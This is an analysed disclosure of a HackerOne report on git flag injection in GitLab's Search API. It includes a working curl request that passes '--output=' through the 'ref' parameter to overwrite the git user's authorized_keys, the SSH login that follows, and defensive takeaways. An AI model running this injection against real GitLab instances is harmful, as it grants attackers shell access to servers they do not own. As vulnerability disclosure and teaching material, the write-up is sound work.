# Git Flag Injection in GitLab Search API - Local File Overwrite to RCE

## Metadata
- **Source:** HackerOne
- **Report:** 658013 | https://hackerone.com/reports/658013
- **Submitted:** 2019-07-24
- **Reporter:** vakzz
- **Program:** GitLab
- **Bounty:** Not specified
- **Severity:** Critical
- **Vuln:** Command Injection, Argument Injection, Improper Input Validation, Privilege Escalation
- **CVEs:** None
- **Category:** memory-binary

## Summary
The GitLab Search API's wiki_blobs scope fails to sanitize the `ref` parameter, allowing attackers to inject arbitrary git command flags. This enables arbitrary file creation/overwrite on the server, which can be leveraged to inject SSH public keys into authorized_keys and achieve remote code execution as the git user.

## Attack scenario
1. Attacker creates a new wiki page with a commit message containing their SSH public key
2. Attacker calls the Search API with injected ref parameter: ref=--output=/var/opt/gitlab/.ssh/authorized_keys
3. The unsanitized ref parameter is concatenated into a git command, causing git log output to be written to authorized_keys
4. Attacker's SSH public key is now present in the git user's authorized_keys file
5. Attacker establishes SSH connection to the GitLab server using their private key
6. Attacker gains remote shell access as the git user (uid=998) with ability to execute arbitrary commands

## Root cause
The ref parameter from user input is directly concatenated into a git command string without sanitization or proper argument escaping. The application fails to use parameterized/safe command construction methods, allowing flag injection attacks where attacker-controlled values are interpreted as git command-line flags rather than arguments.

## Attacker mindset
An authenticated attacker (with API token) identifies that user-supplied parameters flow directly into system commands. Recognizing git's --output flag behavior, the attacker chains this with knowledge of GitLab's file permissions and SSH key-based authentication to escalate from API access to shell access on the underlying system.

## Defensive takeaways
- Never concatenate user input directly into command strings; use parameterized APIs or shell escaping libraries
- Validate and whitelist the ref parameter to only allow valid git reference formats (branch names, commit hashes, tags)
- Use array-based command construction (execve-style) rather than string concatenation when invoking external processes
- Implement strict allowlists for git flags that can be passed; reject any input containing leading dashes or suspicious characters
- Apply principle of least privilege: run git operations with minimally required permissions, not as the git system user
- Use security scanning tools to detect command injection patterns in code reviews
- Implement comprehensive input validation at API boundaries before data reaches subprocess execution

## Variant hunting
Search for other API endpoints or functions that accept user-controlled ref/branch/tag parameters and pass them to git commands. Check search functionality across blob, commit, and repository browsing features. Examine any location where git rev-parse, git log, git show, or similar commands are constructed with user input.

## MITRE ATT&CK
- T1190
- T1202
- T1548
- T1021.004

## Notes
This is a chain vulnerability: command injection (T1190) leads to arbitrary file write, which leads to SSH key injection, enabling remote access (T1021.004) and privilege escalation. The vulnerability requires API authentication but the impact is complete system compromise. The git user is typically configured to run GitLab Shell, giving attackers potential access to repository operations beyond what should be permitted.

## Full report
<details><summary>Expand</summary>

### Summary

The `wiki_blobs` scope of the Search API can be provided with an arbitrary `ref` parameter, allowing for additional flags to be injected into the git command. 

For example the following API call:

```
`curl --header "PRIVATE-TOKEN: $TOKEN" 'http://gitlab-vm.local/api/v4/projects/4/search?scope=wiki_blobs&search=page&ref=--output=/tmp/file'`
```

The above will generate the following git command causing the the last commit log to be written to `/tmp/file`

```
/opt/gitlab/embedded/bin/git --git-dir /var/opt/gitlab/git-data/repositories/@hashed/4b/22/4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.wiki.git log --max-count=1 --output=/tmp/file
```

### Steps to reproduce

1. Create a wiki new wiki page called `page` with the commit message `controlled content`
2. Search for the wiki blob via the Search API, with the injected ref flag:
```
curl --header "PRIVATE-TOKEN: $TOKEN" 'http://gitlab-vm.local/api/v4/projects/5/search?scope=wiki_blobs&search=page&ref=--output=/tmp/file'
```
3. See that the file has been created:
```
git@gitlab-vm:~$ cat /tmp/file
commit f00f9538d29b176e9dfb2eb1bfe1eab190cad3d9
Author: Administrator <admin@example.com>
Date:   Wed Jul 24 13:08:51 2019 +0000

    controlled content
```


### Impact
This can be used to overwrite `/var/opt/gitlab/.ssh/authorized_keys` with an attackers key by following the above steps allowing remote access and code execution.

1. Create a new rsa key
2. Create a new wiki page setting the commit message to the rsa public key
3. Run the Search API with `ref=--output=/var/opt/gitlab/.ssh/authorized_keys`
4. ssh into gitlab using the created key:

```
$ ssh git@gitlab-vm.local -i gitlab
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-70-generic x86_64)
$ id
uid=998(git) gid=998(git) groups=998(git)

$ cat /var/opt/gitlab/.ssh/authorized_keys
commit 00c8e52996654d02bcbdba47dc25ee73671cbfd6
Author: Administrator <admin@example.com>
Date:   Wed Jul 24 12:56:23 2019 +0000

    ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxsqkWZobL5DBOnM3rtE7ZDP4d9v0lABJRGJbovHHTNY2iH3x3pjjerPfLDO21Gkyfzn4J+x6O6GleMAB5nxnZRH7E44khfW6Ldql29Rv2Q/IYCsBSKxGT6RCOFusoRi1uHlQmexIh4gZkmPeFfDLTy70Xv3FpPLfKE/EiVOjuEtY9JUC4MVlPHaTzZ2HE4sZT5tvcm9YtSpjT2v0SMR8uCXcKMAx4Tsu/Un2N5UziXgtRF+vD0fRhNyKIkOtULwBgWkL5RE71vYbxOhviqTAld7r70TIWSzSUHcUewbMS5XcEdBwl3XI/9qzo+jOA0Ulf2bkkROpELBoHwfLdpu9p will@MacBook-Pro.local
```

### What is the current *bug* behavior?
The `ref` param is passed directly to the git command without being sanitized.

### What is the expected *correct* behavior?
The `ref` param should be sanitized or used in a way that doesn't allow for flag injection 

#### Results of GitLab environment info

```
$ sudo gitlab-rake gitlab:env:info

System information
System:		Ubuntu 16.04
Current User:	git
Using RVM:	no
Ruby Version:	2.6.3p62
Gem Version:	2.7.9
Bundler Version:1.17.3
Rake Version:	12.3.2
Redis Version:	3.2.12
Git Version:	2.21.0
Sidekiq Version:5.2.7
Go Version:	unknown

GitLab information
Version:	12.1.0
Revision:	295480f4553
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	10.7
URL:		http://gitlab-vm.local
HTTP Clone URL:	http://gitlab-vm.local/some-group/some-project.git
SSH Clone URL:	git@gitlab-vm.local:some-group/some-project.git
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers:

GitLab Shell
Version:	9.3.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

## Impact

An attacker can overwrite or create files with mostly controlled content, allowing them to gain remote ssh access to gitlab as the `git` user

</details>

---
*Analysed by Claude on 2026-05-11*
